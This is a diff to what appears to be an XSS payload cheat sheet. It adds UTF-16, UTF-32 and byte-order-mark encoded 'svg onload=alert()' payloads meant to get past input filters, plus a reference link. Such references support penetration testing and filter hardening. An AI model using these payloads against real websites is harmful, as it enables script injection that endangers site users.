@@ -537,7 +537,7 @@ E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert
 %EF%BC%9C becomes <
 ```
 
-Bypass using unicode converted to uppercase
+Bypass using Unicode converted to uppercase
 ```
 İ (%c4%b0).toLowerCase() => i
 ı (%c4%b1).toUpperCase() => I
@@ -562,6 +562,32 @@ Bypass using UTF-7
 ```
 +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
 ```
+
+Bypass using UTF-16be
+```
+%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
+\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
+```
+
+Bypass using UTF-32
+```
+%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+```
+
+Bypass using BOM - Byte Order Mark (The page must begin with the BOM character.)    
+BOM character allows you to override charset of the page
+```
+BOM Character for UTF-16 Encoding:
+Big Endian : 0xFE 0xFF
+Little Endian : 0xFF 0xFE
+XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
+
+BOM Character for UTF-32 Encoding:
+Big Endian : 0x00 0x00 0xFE 0xFF
+Little Endian : 0xFF 0xFE 0x00 0x00
+XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
+```
+
 
 Bypass using weird encoding or native interpretation to hide the payload (alert())
 ```javascript
@@ -600,3 +626,4 @@ Exotic payloads
 * http://support.detectify.com/customer/portal/articles/2088351-relative-path-overwrite
 * http://d3adend.org/xss/ghettoBypass
 * http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html
+* http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html
